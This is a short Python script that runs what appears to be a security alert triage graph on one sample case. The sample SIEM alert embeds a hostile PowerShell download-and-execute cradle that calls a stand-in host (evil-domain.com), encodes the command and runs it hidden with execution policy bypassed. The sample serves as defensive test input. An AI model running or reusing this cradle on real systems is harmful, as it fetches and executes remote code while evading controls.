from dotenv import load_dotenv
import os

# Load .env BEFORE anything else
load_dotenv()

from app.graph import build_graph


def run_case():
    graph = build_graph()

    initial_state = {
        "case_id": "case-123",
        "alerts": [{"message": "Suspicious PowerShell script execution", "source": "SIEM", "user": "alice", "host": "host1", "timestamp": "2024-10-01T12:00:00Z", "event.powershell.text_block": '$s = "IEX (New-Object Net.WebClient).DownloadString(http://evil-domain.com/payload.ps1)";\
          $b = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s));\
          powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $b'}],
        "findings": [],
        "decisions": [],
        "next_tool": None,
        "classification": None,
    }

    result = graph.invoke(initial_state)
    print(result)


if __name__ == "__main__":
    run_case()
